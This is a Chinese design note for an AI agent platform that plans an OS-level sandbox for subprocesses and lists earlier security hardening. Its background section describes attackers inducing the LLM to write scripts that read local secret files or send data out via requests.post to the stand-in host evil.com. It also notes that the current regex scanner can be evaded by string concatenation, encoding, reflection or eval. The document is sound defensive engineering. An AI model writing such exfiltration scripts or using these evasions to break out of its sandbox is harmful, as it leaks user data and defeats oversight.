# 安全技术债 — OS 级子进程沙箱

> 状态：方案已设计，待实施 | 优先级：P2 | 预估：~470 行

## 背景

当前沙箱是工具 API 层的（`read`/`write`/`exec` 等工具的路径校验），但 `exec`/`exec_skill`/`python_ptc` 三处通过 `spawn` 出来的子进程继承 Agent 进程的完整文件系统权限。攻击者可通过诱导 LLM 编写 Python 脚本，在脚本中直接 `open("C:\\Users\\admin\\secret.txt")` 或 `requests.post("http://evil.com/exfil", data=...)` 来越界访问。

2026-05-27 已实施：
- 提示词层：安全边界第 6 条「禁止脚本越界」（软防护）
- 代码扫描层：`python-ptc/index.js` 中 `scanSandboxBypass()` 正则检测（中防护）

但正则扫描可被字符串拼接/编码/反射绕过，需要 OS 级硬防护。

## 方案

新增 `src/security/process-sandbox.js`，在子进程 spawn 前将其放入 OS Sandbox：

- **Windows**：Job Object + 文件系统白名单
- **Linux**：bubblewrap (`bwrap`)

### Windows Job Object 能力

| 能力 | 用途 |
|------|------|
| 文件系统白名单 | 只允许读写 `{SANDBOX_ROOT}/**` + Python/Node 运行时 |
| 网络阻断 | 禁止出站连接（除 `127.0.0.1` python_ptc RPC + 配置的白名单API） |
| 进程树管控 | 父进程被杀 → 子进程自动终止；禁止子进程再 spawn 子进程 |
| 剪贴板隔离 | 禁止子进程读写剪贴板 |

### 白名单配置

文件：`config/process-sandbox.json`（新文件）

```jsonc
{
  "filesystem": {
    "allow_read": [
      "{SANDBOX_ROOT}/**",
      "{PYTHON_HOME}/Lib/**",
      "{NODE_HOME}/**",
      "C:/Windows/System32/**"
    ],
    "allow_write": ["{SANDBOX_ROOT}/**"]
  },
  "network": {
    "allow_loopback": true,
    "allow_hosts": ["ip-api.com"]
  },
  "process": {
    "allow_child_spawn": false
  }
}
```

### 替换点

| 调用方 | 当前 | 改为 |
|--------|------|------|
| `exec-common.js` | `exec()` / `spawn()` | `sandboxExec()` / `sandboxSpawn()` |
| `python-ptc/index.js` | `spawn(pythonPath, ...)` | `sandboxSpawn(pythonPath, ...)` |

### 分阶段上线

| 阶段 | 范围 | 开关 |
|------|------|------|
| Phase 1 | `exec_skill` isolated 模式 | `EXEC_PROCESS_SANDBOX=isolated-only` |
| Phase 2 | 所有 `exec` | `EXEC_PROCESS_SANDBOX=true`（默认） |
| Phase 3 | `python_ptc` | 随 Phase 2 |
| Phase 4 | 网络白名单 | 随 Phase 2 |

每阶段可回退。

### 对比

| | 代码扫描（当前） | Job Object |
|---|:---:|:---:|
| 原理 | 正则匹配危险 API | OS 内核级硬限制 |
| 字符串拼接绕过 | ❌ 可绕过 | ✅ |
| Base64/编码绕过 | ❌ 可绕过 | ✅ |
| 反射/动态调用绕过 | ❌ 可绕过 | ✅ |
| eval()/exec() 绕过 | ❌ 可绕过 | ✅ |
| 子进程后代逃逸 | ❌ | ✅ |

### 关键风险

- **Windows Job Object API 需要 FFI 调用 kernel32.dll**，可用 `ffi-napi` 无需 C++ 编译
- **不同 Windows 版本 API 差异**：先检测 API 可用性，不支持则降级
- **误杀合法操作**：白名单预置 Python/node 标准库路径
- **性能**：每次 exec 额外 50-200ms，仅开关开启时生效

---

## 已完成的安全加固

| 日期 | 改动 | 文件 |
|------|------|------|
| 2026-05-26 | `system_info` 身份/网络字段脱敏 + 开关 | `tools/system-info.js` |
| 2026-05-26 | 安全边界提示词指令（友好引导风格） | `core/i18n.js` |
| 2026-05-26 | Tools 区块紧凑化（-70% token） | `core/prompt-builder.js` |
| 2026-05-27 | exec/exec_skill cwd 脱敏（大小写安全） | `tools/exec-common.js` |
| 2026-05-27 | 脚本越界 — 提示词层（第6条安全规则） | `core/i18n.js` |
| 2026-05-27 | 脚本越界 — 代码扫描层（`scanSandboxBypass`） | `tools/python-ptc/index.js` |

## 待处理

- [ ] `## 执行环境` OS 版本号脱敏（`10.0.22621`）
- [ ] `## 工作目录规范` 沙箱路径脱敏（`C:/clawSandbox/` → 占位符）
- [ ] L3 `instructionGeneralTools` 工具映射表精简
- [ ] `exec_skill` 的 `producedFiles` 绝对路径脱敏
- [ ] Bookending `[系统匹配：...]` 从 user 消息移至 system 消息
- [ ] Matcher 提示词工具/技能目录脱敏
- [ ] OS 级子进程沙箱（本文档方案）
